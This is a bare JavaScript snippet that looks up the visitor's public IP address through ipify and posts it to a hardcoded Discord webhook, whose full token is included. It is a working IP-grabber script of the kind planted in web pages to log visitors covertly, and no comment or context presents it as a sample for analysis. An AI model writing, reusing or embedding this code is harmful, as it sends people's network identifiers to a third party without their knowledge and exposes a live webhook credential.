var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data){
    ip = data.ip;
    var webhook = 'https://discordapp.com/api/webhooks/1125133583024148510/hELenBpgmQssv5E-vAcc96FMIRi691ZkkfrxoKCpotnTyG2OeJ6PJlpm6j3GFUpxOS7Y';
    var message = {
        content: 'IP:' + ip
    }


    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});